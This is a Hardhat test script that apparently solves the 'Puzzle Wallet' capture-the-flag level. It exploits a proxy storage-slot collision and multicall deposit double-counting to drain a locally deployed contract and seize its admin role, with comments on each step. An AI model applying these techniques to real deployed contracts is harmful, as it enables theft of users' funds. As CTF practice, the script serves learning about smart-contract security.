import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let eoa: Signer;
let other1: Signer;
let other2: Signer;
let attacker: Contract;
let puzzleProxy: Contract;
let puzzleWallet: Contract;
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, other1, other2] = accounts;

  const puzzleWalletFactory = await ethers.getContractFactory('PuzzleWallet')
  puzzleWallet = await puzzleWalletFactory.connect(other2).deploy()

  // generating bytecode for init(1000) function in PuzzleWallet
  let functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("init(uint256)")).substring(0,10)
  let functionParams = ethers.utils.defaultAbiCoder.encode(["uint256"],[precision.mul(10)]).substring(2)
  let functionInput = functionSig+functionParams
  
  // proxy calls init(..) upon its creation
  const puzzleProxyFactory = await ethers.getContractFactory('PuzzleProxy')
  puzzleProxy = await puzzleProxyFactory.connect(other2).deploy(await other2.getAddress(),puzzleWallet.address,functionInput)

  // whitelisting other2 for sending funds
  functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("addToWhitelist(address)")).substring(0,10)
  functionParams = ethers.utils.defaultAbiCoder.encode(["address"],[await other2.getAddress()]).substring(2)
  functionInput = functionSig+functionParams
  await other2.sendTransaction({to:puzzleProxy.address, data:functionInput})

  // other2 sending funds to proxy
  functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("deposit()")).substring(0,10)
  await other2.sendTransaction({to:puzzleProxy.address, data:functionSig, value:precision})
});

it("solves the challenge", async function () {

  // pendingAdmin is in the same slot as owner
  await puzzleProxy.connect(eoa).proposeNewAdmin(await eoa.getAddress())

  // pendingAdmin/owner is now eoa, therefore eoa can whitelist itself
  let functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("addToWhitelist(address)")).substring(0,10)
  let functionParams = ethers.utils.defaultAbiCoder.encode(["address"],[await eoa.getAddress()]).substring(2)
  let functionInput = functionSig+functionParams
  await eoa.sendTransaction({to:puzzleProxy.address, data:functionInput})
  
  // beginning balance of the contract -- need to drain all funds before admin can be taken
  console.log((await ethers.provider.getBalance(puzzleProxy.address)).toString())

  // combining deposit() with a multicall([deposit()]) in a multicall(..) allows for double counting msg.value
  let depositFunctionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("deposit()")).substring(0,10)

  functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("multicall(bytes[])")).substring(0,10)
  functionParams = ethers.utils.defaultAbiCoder.encode(["bytes[]"],[[depositFunctionSig]]).substring(2)
  functionInput = functionSig+functionParams

  let finalFunctionParams = ethers.utils.defaultAbiCoder.encode(["bytes[]"],[[depositFunctionSig,functionInput]]).substring(2)
  let finalFunctionInput = functionSig+finalFunctionParams
  await eoa.sendTransaction({to:puzzleProxy.address, data:finalFunctionInput, value:precision})

  // eoa adds one ETH, but its balance is credited 2 ETH
  console.log((await ethers.provider.getBalance(puzzleProxy.address)).toString())

  // eoa utilizing execute(..) to remove the 2 ETH balance
  functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("execute(address,uint256,bytes)")).substring(0,10)
  functionParams = ethers.utils.defaultAbiCoder.encode(["address","uint256","bytes"],[await eoa.getAddress(),precision.mul(2),"0x"]).substring(2)
  functionInput = functionSig+functionParams
  await eoa.sendTransaction({to:puzzleProxy.address, data:functionInput})

  // proxy has been drained of all funds
  console.log((await ethers.provider.getBalance(puzzleProxy.address)).toString())  

  // maxBalance is in the same slot as admin
  functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("setMaxBalance(uint256)")).substring(0,10)
  functionParams = "0".repeat(24)+(await eoa.getAddress()).substring(2,40+2)
  functionInput = functionSig+functionParams
  await eoa.sendTransaction({to:puzzleProxy.address, data:functionInput})

  // maxBalance/admin is now eoa
  console.log(await puzzleProxy.admin())

});

after(async () => {
  expect(await puzzleProxy.admin()).to.be.equal(await eoa.getAddress())
});
